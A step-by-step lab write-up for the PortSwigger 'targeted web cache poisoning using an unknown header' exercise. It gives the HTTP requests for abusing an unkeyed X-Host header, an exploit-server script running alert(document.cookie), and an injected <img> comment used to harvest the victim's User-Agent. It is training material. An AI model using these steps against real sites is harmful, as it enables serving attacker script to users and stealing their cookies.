# Targeted Web Cache Poisoning Using an Unknown Header

## Definition



**Web Cache Poisoning** occurs when an attacker can influence a server response using attacker-controlled input, causing 
a malicious response to be stored in a cache and served to other users.



In this lab, the challenge is not only poisoning the cache, but making sure the poisoned response is served to the 
**specific subset of users containing the intended victim**.



---



## Lab Goal



Poison the cache with a response that executes:



```javascript id="v4hx8c"

alert(document.cookie)

```



in the victim's browser.



---



## 1. Find the Homepage Request



From **Proxy → HTTP history**, find:



```http id="b3e8pp"

GET / HTTP/1.1

```



Send it to **Repeater**.



Send the request twice to identify whether the homepage is cached.



---



## 2. Identify the Cache Oracle



The response contains:





```http id="4r7x3u"

Vary: User-Agent

Cache-Control: max-age=30

Age: ...

X-Cache: hit

```



`X-Cache: hit` confirms that the response was served from the cache.



`Age` shows how long the response has been cached.



`Cache-Control: max-age=30` indicates the cache lifetime.



---



## 3. Understand `Vary: User-Agent`



The response contains:



```http id="b8qz0m"

Vary: User-Agent


```



This instructs the frontend cache to consider the `User-Agent` when generating the cache key.



Conceptually:



```text

User-Agent A → Cache Entry A

User-Agent B → Cache Entry B

```



This becomes important because the victim uses a different User-Agent from the attacker.



---



## 4. Confirm User-Agent Is Part of the Cache Key



Change:



```http id="x4v8ja"

User-Agent: test123

```



Use a cache buster:



```http id="w3x5h7"

GET /?cb=1234 HTTP/1.1

```




The first request should produce a cache miss.



Sending the same request again should produce:



```http id="v7q9kx"

X-Cache: hit


```



This confirms that the cache is using the User-Agent as part of its cache key.



---



## 5. Find the Unknown Header



Use:



**Right click → Extensions → Param Miner → Guess headers**



Param Miner performs header fuzzing to discover hidden or unknown headers that may affect the application's behavior.



The important result is:


```text

x-host

```



So we test:



```http id="m8z2fq"

X-Host: example.com

```



---



## 6. Test `X-Host`



Add:



```http id="u6k1rp"

X-Host: example.com

```



Use a cache buster to obtain a fresh response.



Search the response for:



```text

example.com

```



If the value is reflected, `X-Host` is influencing the response.





---



## 7. Prepare the Exploit Server



Create:



**File name:**



```text id="a7s5dm"

/resources/js/tracking.js

```



**Body:**



```javascript id="x2f9nv"

alert(document.cookie)

```





Click **Store**.



---



## 8. Poison the Cache



Set:



```http id="q6y8wk"

X-Host: exploit-server-id.exploit-server.net

```



Initially keep the cache buster.



Send the request until the response contains the Exploit Server URL and:



```http id="t4c2pz"

X-Cache: hit

```




This indicates that the malicious response has been cached.



---





## 9. Discover the Victim's User-Agent



Because of:




```http id="e9j3sl"

Vary: User-Agent

```



we need to identify the victim's User-Agent.



Post a comment containing:



```html id="r8p1cs"

<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />

```



When the victim views the comment, their browser requests the image from the Exploit Server.



Go to:



**Exploit Server → Access log**



Wait for a request from a different user and copy the victim's `User-Agent`.



Example:



```http id="f5z7ad"

User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36

```



---



## 10. Target the Victim's Cache Entry




Return to the malicious request in Repeater.



Replace your User-Agent with the victim's:



```http id="k2n6yx"

User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36

```




Remove the cache buster:




```http id="p4w8cs"

GET / HTTP/1.1

```



Keep:



```http id="j5m9rq"

X-Host: exploit-server-id.exploit-server.net

```



---



## 11. Re-Poison the Cache


Keep sending the request until you see:





```http id="d8v2fk"

X-Cache: hit

```



and the Exploit Server URL is reflected in the response.




The poisoned response is now associated with the victim's User-Agent and therefore the victim's cache entry.



---



## 12. Victim Receives the Poisoned Response



The final attack flow is:



```text

Victim Request

      ↓

Victim User-Agent

      ↓

Victim Cache Key

      ↓

Poisoned Cache Entry

      ↓

Exploit Server

      ↓

Malicious JavaScript

      ↓

alert(document.cookie)

```



Keep re-poisoning the cache if necessary until the victim visits and the lab is solved.



---



## Why Was the Victim's User-Agent Necessary?



Because `Vary: User-Agent` causes different User-Agents to use different cache entries.



If we poison the cache using our User-Agent:



```text

Attacker User-Agent


        ↓

Cache Entry A

```



but the victim uses:



```text


Victim User-Agent
        ↓

Cache Entry B

```




the victim will receive Entry B instead of our poisoned Entry A.




Therefore, we need to poison the cache using the victim's User-Agent.



---



## Key Takeaways



* Param Miner can discover hidden or unknown headers.

* `X-Host` was the vulnerable unkeyed header.

* `X-Host` influenced the response.

* `Vary: User-Agent` made the User-Agent part of the cache key.

* Cache poisoning therefore had to be targeted at the victim's cache entry.

* The comment payload caused the victim's browser to contact the Exploit Server.


* The Exploit Server access log revealed the victim's User-Agent.

* A cache buster is useful during testing but must be removed for the final poisoning.


* `X-Cache: hit` helps confirm that the poisoned response has been cached.

* The goal is to poison the **same cache entry that the victim will request**.



## Attack Flow



```text

Param Miner


     ↓
Discover X-Host

     ↓

X-Host affects response

     ↓

Vary: User-Agent

     ↓

Cache separated by User-Agent

     ↓

Trigger victim request

     ↓

Get victim's User-Agent

     ↓

Use victim's User-Agent

     ↓

Remove cache buster

     ↓


Poison victim's cache entry


     ↓

Victim visits

     ↓

alert(document.cookie)

```



## PortSwigger



[Web Cache Poisoning — PortSwigger Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning?utm_source=chatgpt.com)



[Lab: Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-using-an-unknown-header?utm_source=chatgpt.com)
